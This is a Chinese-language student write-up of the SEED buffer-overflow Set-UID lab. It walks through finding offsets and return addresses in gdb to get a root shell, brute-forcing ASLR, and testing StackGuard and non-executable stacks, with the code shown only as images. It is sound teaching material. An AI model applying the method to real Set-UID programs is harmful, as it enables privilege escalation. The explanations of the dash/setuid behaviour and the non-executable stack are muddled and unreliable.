      <title>Buffer Overflow Attack Lab (Set-UID Version)</title>
      <link href="/2022/09/20/buffer_overflow/"/>
      <url>/2022/09/20/buffer_overflow/</url>
      
        <content type="html"><![CDATA[<h1 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h1><p>缓冲区溢出定义为程序试图将数据写入缓冲区边界之外的情况。这一漏洞可以被恶意用户利用来改变程序的控制流，从而执行恶意代码。本实验的目的是让学生深入了解此类漏洞，并学习如何在攻击中利用此类漏洞。</p><span id="more"></span><p>在本实验中，学生将获得一个具有缓冲区溢出漏洞的程序；他们的任务是开发一种利用漏洞的方案并最终获得 root 权限。除了攻击之外，还将引导学生通过操作系统中已实施的几个保护机制来抵御缓冲区溢出攻击。学生需要评估这些机制是否有效并解释原因。本实验涵盖以下主题:</p><ol><li>缓冲区溢出漏洞与攻击</li><li>堆栈布局</li><li>地址随机化，不可执行栈以及 StackGuard</li><li>Shellcode (32-bit and 64-bit)</li><li>return-to-libc 攻击，旨在绕过不可执行栈的防御措施，相关内容会在另一个单独的实验中被覆盖</li></ol><h1 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h1><h2 id="Task-1：熟悉-Shellcode"><a href="#Task-1：熟悉-Shellcode" class="headerlink" title="Task 1：熟悉 Shellcode"></a>Task 1：熟悉 Shellcode</h2><p>给出了两个 shellcode 的副本，一个是 32-bit 另一个是 64-bit。当我们使用- m32 选项编译程序时，将使用 32-bit 的版本；如果没有-m32 选项，将使用 64-bit的版本。根据提供的 Makefile 文件，你可以通过输入 make 命令来编译程序。这样将会生成两个二进制文件：a32.out (32-bit) 和 a64.out(64-bit)。运行它们并描述你的观察结果。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130212823.png"></p><p>如上图所示，可以分别得到两个超级用户权限的shell窗口</p><h2 id="Task-2：理解漏洞程序"><a href="#Task-2：理解漏洞程序" class="headerlink" title="Task 2：理解漏洞程序"></a>Task 2：理解漏洞程序</h2><p>所给出程序存在缓冲区溢出漏洞。它首先从 badfile 文件中读取一个输入，然后将该输入传递给函数 bof() 中的另一个缓冲区。原始输入的最大长度可以为 517 字节，但是 bof() 中的缓冲区只有BUF_SIZE(100) 字节长，小于 517 字节。因为函数 strcpy() 不检查边界，所以会发生缓冲区溢出。由于此程序是一个以 root 为所有者的 Set-UID 程序，如果普通用户可以利用该缓冲区溢出漏洞，普通用户可能会获得 root shell。需要注意的是，该程序从 badfile 文件中获取输入，这个文件受用户控制。现在我们的目标是为 badfile 文件创建内容，这样当漏洞程序将内容复制到其缓冲区时，就可以获得 root shell。编译结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213005.png"></p><h2 id="Task-3-：对-32-bit-程序实施攻击-Level1）"><a href="#Task-3-：对-32-bit-程序实施攻击-Level1）" class="headerlink" title="Task 3 ：对 32 bit 程序实施攻击 (Level1）"></a>Task 3 ：对 32 bit 程序实施攻击 (Level1）</h2><p>为了利用目标程序中的缓冲区溢出漏洞，我们需要构造一个payload ，并将其保存在 badfile 文件 中。我们将使用一个 python 程序来做到这一点。在 Labsetup 文件夹中，我们提供了 exploit.py 程序 框架。代码不完整，学生需要替换代码中的一些基本值。 补全值如下图 所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213234.png"></p><p>运行结果如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213318.png"></p><p>解释说明：</p><ul><li><p>Shellcode 填写：</p><p>由于该程序为 32bit，且在task1 中已经给出了 32bit 的 shellcode 编码，只需要将其补充到python 文件中即可。</p></li><li><p>Start 填写：</p><p>将恶意代码置于buffer 的尾部，可以在填充NOP 指令后，更方便的跳转到恶意代码，降低攻击难度。</p></li><li><p>Ret（返回地址）填写：</p><p>如图，该图即为在调用 strcpy 函数 时，栈中的具体情况，用来确定 offset 和返回地址 ret</p></li></ul><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213506.png"></p><p>由于关闭了地址随机化，所以在gdb 调试时所得到的地址与运行时相同，通过 gdb 调试，可以在bof 函数的逐步调试过程中，得到上一个调用函数的ebp 的值所在的地址，如下图所示，为 0xffffd148</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213628.png"></p><p>然后根据栈在调用函数时候的结构如上图，可以知道，在该帧指针上方即为bof函数的返回地址，又因为程序为 32bit，因而需要对该地址进行 8 位的偏移，即可得到 bof 函数的返回地址为：0xffffd148+8。</p><ul><li><p>Offset 填写（64bit 程序同理）：</p><p>在gdb 中调试bof 函数时，可以通过disas 指令得到bof 函数的具体执行步骤，在其中找到call strcpy@plt 一行，加入断点，在重新调试程序，执行到该断点时，函数栈中ebp 仍指向上一个函数的ebp，而在其下面存放的是 bof 函数中所定义的局部变量buffer，因此，我们只需要取到ebp（rbp -64bit）的地址，以及 buffer 的地址，将其做差得到如下结果：</p><p>bof 函数的具体执行步骤，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213724.png"></p><p>在调用strcpy 函数时加入断点：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213804.png"></p><p>计算offset：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213846.png"></p><p>根据在计算ret 时所绘制的函数栈情况，可以看到返回地址所放置的位置应该在该差值上继续向上偏移 4 位（64bit 程序中偏移 8 位），因而为 112。</p></li></ul><h2 id="Task-4：在不知道缓冲区大小的情况下实施攻击-Level-2"><a href="#Task-4：在不知道缓冲区大小的情况下实施攻击-Level-2" class="headerlink" title="Task 4：在不知道缓冲区大小的情况下实施攻击 (Level 2)"></a>Task 4：在不知道缓冲区大小的情况下实施攻击 (Level 2)</h2><p>在 Level 1 攻击中，我们通过 gdb 调试获得了缓冲区的大小，但是在真实攻击中，缓冲区大小的信息可能很难获得。例如，如果目标程序是运行在远程机器上的服务器程序时，那么我们将无法获得二进制代码或源代码的副本。在本任务中，我们将添加一个约束条件：你仍然可以使用 gdb，但不允许获得缓冲区的大小。实际上， Makefile 文件提供了缓冲区的大小，但是在攻击中不允许使用该信息。你的任务是让漏洞程序在此约束条件下运行 shellcode。</p><p>补全值如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213939.png"></p><p>运行结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213958.png"></p><p>解释说明：</p><p>Shellcode，start，ret 填写方法同任务三，在填写 offset 时，由于不知道缓冲区大小，不可以直接获取buffer 地址，因而需要尝试其他方法如下，在 gdb 中查看bof 函数的执行步骤时可以观察到如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214058.png"></p><p>可以观察到bof 函数栈向下开辟了 164 位，因而可以推断出其缓冲区的大小在 100-164 之间，向下进行尝试，直到攻击成功，即可得到缓冲区大小为 160，同理即可计算出offset 的值位 172。</p><h2 id="Task-5：对-64-bit-程序实施攻击-Level-3"><a href="#Task-5：对-64-bit-程序实施攻击-Level-3" class="headerlink" title="Task 5：对 64-bit 程序实施攻击 (Level 3)"></a>Task 5：对 64-bit 程序实施攻击 (Level 3)</h2><p>在本任务中，我们将漏洞程序编译为一个称为 stack-L3 的 64-bit 二进制文件。我们将对该程序实施 攻击。编译和设置 Set-UID 命令已经包含在 Makefile 文件中。与之前的任务类似，你需要在实验报告中提供详细的攻击过程。对于 64-bit 程序，使用 gdb 调试的方法与 32-bit 程序相同。唯一的区别是帧指针寄存器的名称不同。在 x86 体系结构中，帧指针寄存器为 ebp，而在 x64 体系结构中，帧指针寄存器rbp。</p><p>补全值如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214234.png"></p><p>运行结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214251.png"></p><p>解释说明：</p><p>由于该程序为 64bit，需要修改 shellcode，修改为前面任务中所给出编码后的结果即可，start，ret，offset 的设置方法同 32bit 程序中的攻击，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214334.png"></p><p>此处由于为64位程序，在取值结果上，应该分别偏移16位，和8位。</p><h2 id="Task-6：对-64-bit-程序实施攻击-Level-4"><a href="#Task-6：对-64-bit-程序实施攻击-Level-4" class="headerlink" title="Task 6：对 64-bit 程序实施攻击 (Level 4)"></a>Task 6：对 64-bit 程序实施攻击 (Level 4)</h2><p>本任务中的目标程序 (stack-L4) 与 Level 3 中的目标程序类似，除了缓冲区大小非常小之外。本任务中，我们将缓冲区大小设置为 10，而在 Level 3 中的缓冲区要大得多。目标还是一样的：通过攻击Set-UID 程序来获得 root shell。由于缓冲区大小较小，你可能会在攻击中遇到其他挑战。在这种情况下，你需要解释你是如何在攻击中解决这些挑战的。</p><p>补全值如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214455.png"></p><p>运行结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214523.png"></p><p>解释说明：</p><p>填写方法同上一次任务，未遇到新的挑战。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214608.png"></p><h2 id="Task-7：攻破-dash-的保护机制"><a href="#Task-7：攻破-dash-的保护机制" class="headerlink" title="Task 7：攻破 dash 的保护机制"></a>Task 7：攻破 dash 的保护机制</h2><p>将 call_shellcode.c 编译为以 root 为所有者的二进制文件（通过输入”make setuid” 命令）。在不调用 setuid(0) 的情况下运行 a32.out 和 a64.out，然后在调用 setuid(0) 的情况下再次运行a32.out 和 a64.out。请描述并解释你的观察结果。</p><p>运行结果：</p><p>​下图为调用setuid(0) 的情况，如图得到了超级用户权限的shell：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214709.png"></p><p>​下图为没有调用setuid(0) 的情况，如图得到普通用户的 shell：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214729.png"></p><p>解释说明：</p><p>在调用setuid(0) 的情况下，将&#x2F;bin&#x2F;sh 符号连接到了&#x2F;bin&#x2F;dash，运行shellcode 后会得到超级用户权限，而未调用时，&#x2F;bin&#x2F;sh 符号连接到了 zsh，仅可以得到普通用户权限。</p><p>现在，使用更新的 shellcode 并打开 shell 的安全机制，我们可以再次尝试攻击漏洞程序。对 Level 1 重新进行攻击，观察是否可以获得 root shell。在获得 root shell 之后，请运行下面的命令证明安全机制已经打开。虽然不要求对 Level 2 和 Level 3 重新进行攻击，但是你可以自行尝试并观察攻击是否有效。</p><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214805.png"></p><p>可以观察到&#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;dash，证明安全机制已打开。</p><h2 id="Task-8：攻破地址随机化"><a href="#Task-8：攻破地址随机化" class="headerlink" title="Task 8：攻破地址随机化"></a>Task 8：攻破地址随机化</h2><p>在 32-bit Linux 机器上，栈的可用熵为 19 比特，意味着栈的基地址有 219 &#x3D; 524, 288 种可能性。这个数字并不是很大，可以很容易地使用暴力方法穷举。在本任务中，我们使用这种方法来攻破 32-bit VM 上的地址随机化安全机制。首先我们使用以下命令打开 Ubuntu 的地址随机化，然后对 stack-L1 实施相同的攻击。请描述和解释你的观察结果。</p><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214858.png"></p><p>解释说明：</p><p>开启地址随机化后，python 文件中所填写的地址为调试程序时得到的栈函数中的地址，但在重新执行函数时，其地址发生改变，返回地址错误，因而攻击失败。</p><p>然后我们使用暴力的方法反复攻击漏洞程序，直到我们放在 badfile 文件中的地址正确为止。我们 只对 32-bit 程序 stack-L1 尝试攻击。</p><p>攻击结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214933.png"></p><h2 id="Task-9：测试其他保护机制"><a href="#Task-9：测试其他保护机制" class="headerlink" title="Task 9：测试其他保护机制"></a>Task 9：测试其他保护机制</h2><ul><li><p>打开 StackGuard 保护机制</p><p>通过在没有-fno-stack-protector 选项的情况下重 新编译漏洞程序 stack.c 来打开 StackGuard 保护机制。在 gcc 4.3.3 版本及更高版本中，默认启用了 StackGuard。实施攻击；报告并解释你的观察结果。</p><p>运行结果如下：</p></li></ul><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130215012.png"></p><p>​解释说明：</p><p>​在打开栈保护机制后重新编译并且进行攻击，会发现攻击失败，报错 “*** stack smashing detected ***: terminatedAborted”</p><p>​原因在于buffer 大小只有 100 而在bof 函数中将 517 位的字符串放到了buffer中，造成了缓冲区溢出，在打开StackGuard 保护机制后，数组越界会发生报错。</p><ul><li><p>打开不可执行栈保护机制</p><p>在本任务中，我们将使栈不可执行。我们在 shellcode 文件夹中完成该实验。 call_shellcode 程序将 shellcode 的副本放在栈上，然后在栈上执行代码。请在不使用-z execstack 选项的情况下重新编译call_shellcode.c，分别编译为 a32.out 和 a64.out。运行它们并描述和解释你的观察结果。</p><p>运行结果如下：</p></li></ul><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130215116.png"></p><p>​解释说明：</p><p>​在打开不可执行栈保护及之后，可以看到重新编译后的.out 文件无法成功运行，原因在于该机制会检测栈中的内容，发现其为非法命令比如打开shell时。便会进行保护机制，使其不可执行，保障系统安全。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
